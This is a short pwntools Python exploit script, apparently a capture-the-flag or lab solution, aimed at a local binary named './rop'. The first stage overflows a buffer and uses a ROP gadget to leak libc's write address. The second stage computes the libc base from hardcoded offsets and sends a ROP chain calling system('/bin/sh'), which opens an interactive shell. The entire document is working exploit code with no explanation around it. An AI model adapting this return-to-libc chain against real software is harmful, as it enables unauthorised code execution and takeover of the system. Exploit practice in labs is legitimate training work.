from pwn import *

# OFFSETS OF INTEREST INSIDE libc.so.6
LIBC_SYSTEM_OFFSET 	= 0x050d60
LIBC_BINSH_OFFSET 	= 0x1d8698
LIBC_WRITE_OFFSET 	= 0x0114a20

print("[*] STAGE 1")

payload_stage_1	= 	b"A"*72				# junk bytes to reach rip
payload_stage_1 +=	p64(0x0000000000400611)		# gadget "pop rsi"
payload_stage_1	+= 	p64(0x601018)			# pointer to "write" address of libc
payload_stage_1 += 	p64(0x007ffff7ffd040)		# ...because the gadget has also a "pop r15" before "ret"
payload_stage_1 += 	p64(0x0000000000400547)		# jump to "main" function to call "write" and leak address

print(f"[*] PAYLOAD = {payload_stage_1}")

p = process("./rop")
p.recvuntil(": ")
p.send(payload_stage_1)
libc_write_addr = u64(p.recvn(8))

print(f"[*] WRITE FUNCTION -> {libc_write_addr}")

# OFFSET CALCULATION ...

print("[*] STAGE 2")
libc_base_addr = libc_write_addr - LIBC_WRITE_OFFSET
libc_system_addr = libc_base_addr + LIBC_SYSTEM_OFFSET
libc_binsh_addr = libc_base_addr + LIBC_BINSH_OFFSET

print(f"[*] LIBC BASE ADDRESS	-> {hex(libc_base_addr)}")
print(f"[*] LIBC SYSTEM ADDRESS -> {hex(libc_system_addr)}")
print(f"[*] LIBC '/bin/sh' ADDRESS -> {hex(libc_binsh_addr)}")

payload_stage_2 = 	b"B"*72
payload_stage_2 += 	p64(0x0000000000400613)
payload_stage_2 += 	p64(libc_binsh_addr)
payload_stage_2 +=	p64(libc_system_addr)

print(f"[*] PAYLOAD = {payload_stage_2}")

p.sendline(payload_stage_2)
p.recv()
p.interactive()



